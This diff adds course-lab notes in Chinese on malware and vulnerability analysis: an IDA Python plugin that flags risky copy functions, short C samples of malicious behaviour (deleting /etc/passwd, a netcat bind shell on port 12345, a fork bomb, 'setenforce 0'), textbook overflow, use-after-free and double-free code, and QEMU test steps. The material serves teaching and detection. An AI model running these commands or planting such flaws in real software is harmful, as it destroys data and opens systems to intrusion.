@@ -1,0 +1,227 @@
+# 插件开发自动化分析
+
+IDA Pro 等反汇编和反编译工具同时支持插件开发，可以利用插件开发实现自动化
+的恶意代码和漏洞辅助检测，如下所示，可以编写如下Python插件代码实现敏感函数查
+找，输出目标函数是否存在以及名称和地址。
+
+import idautils 
+import idc 
+def detect_func (): 
+# 搜索所有函数调用 
+for func_ea in idautils.Functions(): 
+ func_name = idc.get_func_name(func_ea) 
+         
+        # 检查是否使用了拷贝类型的敏感函数 
+        for head in idautils.Heads(func_ea, idc.get_func_attr(func_ea, idc.FUNC
+ ATTR_END)): 
+            mnemonic = idc.GetMnem(head) 
+            if mnemonic in ['call']: 
+                called_func = idc.GetOpnd(head, 0) 
+                if called_func in ['strcpy', 'sprintf', 'gets', 'memcpy']: 
+                    print(f"目标函数调用: {func_name} 中的 {called_func} 在地址 {h
+ ex(head)}") 
+                     
+# 执行检测 
+detect_func ()
+
+# 恶意代码
+
+## 系统文件删除与修改
+
+恶意软件可能会删除或者修改系统关键文件包括系统日志、密码文件。
+#include <stdio.h> 
+#include <stdlib.h> 
+ 
+int main() { 
+    // 删除系统文件 /etc/passwd 
+    if (remove("/etc/passwd") == 0) { 
+        printf("File deleted successfully\n"); 
+    } else { 
+        printf("Error deleting file\n"); 
+    } 
+    return 0; 
+} 
+
+## 开启后门
+
+恶意软件开启额外后门进行隐藏数据传输等行为，例如，
+#include <stdio.h> 
+#include <stdlib.h> 
+ 
+int main() { 
+    // 启动一个恶意的监听端口（例如 12345） 
+    system("nc -l -p 12345 -e /bin/bash &"); 
+    return 0; 
+} 
+
+## 创建僵尸子进程
+
+恶意程序可能会启动大量的进程以消耗系统资源，造成 Denial of Service (DoS) 攻
+击。 
+#include <stdio.h> 
+#include <stdlib.h> 
+ 
+int main() { 
+    while(1) { 
+        // 启动一个新的子进程 
+        if (fork() == 0) { 
+            // 子进程立即退出，成为僵尸进程 
+            exit(0); 
+        } 
+    } 
+    return 0; 
+}
+
+## 禁用系统保护功能
+
+恶意软件可以通过系统函数或者修改系统文件来禁用系统保护功能包括PIE、
+SELinux、ASLR等 
+
+void disable_selinux() {  
+// 禁用 SELinux printf("[+] Disabling SELinux...\n");  
+system("setenforce 0");  
+}
+
+# 软件漏洞
+## 栈溢出
+
+攻击者可能通过缓冲区溢出漏洞来执行恶意代码，获得系统控制权。如下strcpy 
+没有做边界检查，会导致缓冲区溢出，可以用来覆盖返回地址，控制程序流程
+
+#include <stdio.h> 
+#include <string.h> 
+ 
+void vulnerable_function(char *input) { 
+    char buffer[10]; 
+    strcpy(buffer, input);  // 缓冲区溢出漏洞 
+}
+
+## 整数溢出
+整数溢出发生在一个整数运算结果超出了该整数类型的最大或最小值，导致数据被
+错误地表示。通常，整数溢出会导致逻辑错误或安全漏洞。代码中，a 被初始化为 
+unsigned int 类型的最大值 UINT_MAX（通常是 4294967295）。然后，通过 a = a + 1; 
+操作让 a 超过了 unsigned int 的最大值，导致溢出，a 的值变成了 0
+
+#include <stdio.h> 
+#include <limits.h>  // 定义了整数类型的最大最小值 
+ 
+void integer_overflow_example() { 
+    unsigned int a = UINT_MAX;  // 将 a 初始化为 unsigned int 的最大值 
+    printf("a = %u\n", a); 
+    // 模拟整数溢出：a 加 1 会导致溢出 
+    a = a + 1;  // 整数溢出，a 变为 0 
+    printf("After overflow, a = %u\n", a); 
+}
+
+## 堆溢出
+
+堆溢出通常发生在程序分配内存时，写入超出分配区域的数据，从而覆盖堆上其他
+数据。这可能导致程序崩溃，甚至允许攻击者执行任意代码。如下程序程序使用 
+malloc(20) 动态分配了 20 字节的内存。然后通过 strcpy 函数将一个长度超过 20 字
+节的字符串写入 buffer。strcpy 不会检查目标缓冲区的大小，因此它会将超出分配内存
+大小的数据写入堆上可能相邻的内存区域，导致堆溢出。堆溢出可能会覆盖堆中的其他
+数据结构，进而导致程序崩溃或被攻击者利用执行任意代码
+
+#include <stdio.h> 
+#include <stdlib.h> 
+#include <string.h>
+void heap_overflow_example() { 
+    char *buffer = (char *)malloc(20);  // 分配20字节的内存 
+    if (buffer == NULL) { 
+        printf("Memory allocation failed!\n"); 
+        return; 
+    } 
+ 
+    // 模拟堆溢出：我们写入超过20字节的数据，导致溢出 
+    strcpy(buffer, "This is a very long string that exceeds the buffer size
+ "); 
+ 
+    printf("Buffer content: %s\n", buffer); 
+ 
+    free(buffer);  // 释放内存 
+} 
+ 
+int main() { 
+    heap_overflow_example(); 
+    return 0; 
+}
+
+## 使用后重放
+
+访问已释放内存可能导致程序崩溃、数据损坏或在某些情况下被攻击者利用来执行
+恶意代码。例如，如下程序首先通过 malloc 动态分配了一块内存，并将数据写入该内
+存。然后，通过 free(ptr) 释放了这块内存。尽管内存已经被释放，但程序仍然试图访问
+这块内存（即 printf("Data: %s\n", ptr)），产生 Use After Free (UAF) 漏洞
+
+#include <stdio.h> 
+#include <stdlib.h> 
+ 
+void example_uaf() { 
+    char *ptr = malloc(100); // 动态分配内存 
+    if (ptr == NULL) { 
+        return; 
+    } 
+ 
+    // 填充数据 
+    snprintf(ptr, 100, "Hello, world!"); 
+ 
+    // 释放内存 
+    free(ptr);
+ // UAF 漏洞：访问已经释放的内存 
+    printf("Data: %s\n", ptr);  // 这里访问已经被释放的内存 
+}
+
+## 重放释放
+DF（Double Free） 漏洞是指程序错误地对同一块内存进行多次释放。这会导致内
+存管理错误，进而可能被攻击者利用来执行恶意代码
+
+#include <stdio.h> 
+#include <stdlib.h> 
+ 
+void example_df() { 
+    char *ptr = malloc(100);  // 动态分配内存 
+    if (ptr == NULL) { 
+        return; 
+    } 
+ 
+    // 填充数据 
+    snprintf(ptr, 100, "Hello, world!"); 
+ 
+    // 第一次释放内存 
+    free(ptr); 
+ 
+    // 第二次释放同一块内存 (Double Free) 
+    free(ptr);  // 错误：再次释放已经释放的内存 
+}
+
+# 二进制程序模拟执行与调试工具
+sudo apt install -y qemu qemu-user qemu-user-static
+
+模拟执行待测样本，qemu-i386 -strace -d in_asm -D trace.log demo ，生成log文件
+
+
+模拟执行待测程序后，另外打开一个终端telnet 127.0.0.1 12345 连接上即可进行交
+互测试，例如下图运行模拟执行demo程序后和远程终端的交互截图，本实验要求输入
+不同的内容，观察样本软件的执行情况，从而触发全面恶意行为和漏洞。
+
+扩展思考：4.1 在线重组 
+本课程设计当前采用的离线方式，是针对提供的截包pcap文件进行静态的TCP流
+重组，这种方式在实际场景中存在检测滞后响应不及时的问题，如果调整为在线方式实
+时重组则会有很大改进。那么在线方式应该如何实现呢？同学们可以查阅资料，思考并
+尝试。4.2 乱序重组 
+本课程设计当前提供的截包pcap文件，是在无干扰的理想网络环境中截包得到的，
+TCP 数据流是按序完整的，重组比较简单。现实网络场景中，TCP报文段可能出现丢失、
+乱序等异常情况。要在这些异常情况下正确的重组得到传输的文件，应该如何去改进我
+们的程序呢？同学们可以查阅资料，思考并尝试。4.3 自动化动态漏洞检测 
+本课程设计主要采用静态逆向分析工具对样本软件进行漏洞检测与分析，然而静态
+分析方法受限于检测规则设置以及静态逆向分析工具本身的能力等问题，难以避免存在
+较多漏报和误报。因此，在真实漏洞检测中大多采用动态检测方法例如模糊测试技术，
+请同学们自行查阅资料，思考并尝试利用动态检测方法进行漏洞检测并生成漏洞利用输
+入。4.4 基于虚拟机的启发式恶意代码检测 
+本课程设计主要采用基于固定的恶意代码特征静态恶意行为自动化检测方法，然后
+在虚拟环境中进行人工验证，然而，真实场景中，恶意行为变化多样种类繁多且可能会
+采用加密和压缩技术，请同学们自行查阅资料，思考并尝试设计更加通用的启发式检测
+规则，并在虚拟机环境中如QEMU进行自动化恶意行为检测。4.5 系统保护绕过 
+本课程设计中软件程序编译的时候关闭了栈保护，因此栈溢出漏洞可以直接利用，
+但实际应用程序编译时候都会打开许多默认的程序保护功能，请同学们自行查阅资料，
+思考如何利用待测程序中的恶意功能动态关闭程序保护再进行漏洞利用的方法。 
